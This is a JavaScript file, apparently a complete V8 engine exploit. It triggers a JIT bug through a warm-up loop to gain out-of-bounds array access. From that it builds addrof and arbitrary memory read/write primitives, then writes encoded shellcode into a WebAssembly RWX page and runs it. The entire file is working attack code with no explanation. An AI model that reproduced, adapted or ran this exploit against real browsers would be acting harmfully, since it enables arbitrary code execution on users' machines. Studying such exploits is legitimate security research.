let buffer = new ArrayBuffer(8);
let f64Buffer = new Float64Array(buffer);
let u64Buffer = new BigUint64Array(buffer);
let funcArray, oobArray, objArray, floatArray;
let ROUNDS = 5000;
let WASM_BYTES = new Uint16Array([
  24832, 28019,     1,     0, 34049, 32896,
    128, 24577,   256,   895, 32898, 32896,
    256,  1024, 32900, 32896,   256,   112,
   1280, 32899, 32896,   256,   256, 33030,
  32896,   128,  1792, 32913, 32896,   512,
  27910, 28005, 29295,   633,  1024, 24941,
  28265,     0, 35338, 32896,   128, 33793,
  32896,   128, 16640,  2858
]);
let SHELLCODE = new Uint16Array([
  18576, 12216, 26978, 12142,
  26739, 39168, 21584, 21087,
  26726, 25389, 24148, 59474,
     13,     0, 24931,  8308,
  27750, 26465, 29742, 29816,
  22016, 21591, 27230, 22587,
   1295
]);

function f2i(value) {
  f64Buffer[0] = value;
  return u64Buffer[0];
}

function i2f(value) {
  u64Buffer[0] = value;
  return f64Buffer[0];
}

function addrof(obj) {
    objArray[0] = obj;
    return (f2i(oobArray[22]) >> 32n) - 1n;
}

function arbitraryRead(address) {
    let int = f2i(oobArray[31]) >> 32n;
    oobArray[31] = i2f((int << 32n) + (address - 8n + 1n));
    return f2i(floatArray[0]);
}

function arbitraryWrite(address, value) {
    let int = f2i(oobArray[31]) >> 32n;
    oobArray[31] = i2f((int << 32n) + (address - 8n + 1n));
    floatArray[0] = i2f(value);
}

function copyShellcode(rwxPageAddress, shellcode) {
    let buf = new ArrayBuffer(shellcode.length * 2);
    let dataView = new DataView(buf);

    arbitraryWrite(addrof(buf) + 0x14n, rwxPageAddress);

    for (let i = 0; i < shellcode.length; i++) {
        dataView.setUint16(i*2, shellcode[i], true);
    }
}

function func() {
    let inf = -Infinity, i = 0, inf2 = 0;

    for (; inf2 <= 0; inf2 += inf) {
        inf = (inf2 == -Infinity) ? +Infinity : inf;
        i++;
        if (i > 10)
            break;
    }

    let res = Math.abs(inf2);

    res = -Math.max(res, 1024);
    res = -Math.max(res, -1025);
    res = ((res-1022) >> 1) + 10;

    let arr1 = Array(res);
    arr1[0] = 13.37;
    let arr2 = [{}, {}, {}];
    let arr3 = [13.37, 13.37, 13.37];

    return [arr1, arr2, arr3];
}

function exploit() {
    for (let i = 0; i < ROUNDS; ++i) {
        func();
    }

    funcArray = func();
    oobArray = funcArray[0];
    objArray = funcArray[1];
    floatArray = funcArray[2];

    let wasmModule = new WebAssembly.Module(WASM_BYTES);
    let wasmInstance = new WebAssembly.Instance(wasmModule);
    let wasmMain = wasmInstance.exports.main;

    let rwxPageAddress = arbitraryRead(addrof(wasmInstance) + 0x68n);
    console.log(`[*] RWX page address: 0x${rwxPageAddress.toString(16)}`);

    copyShellcode(rwxPageAddress, SHELLCODE);
    wasmMain();
}

exploit()
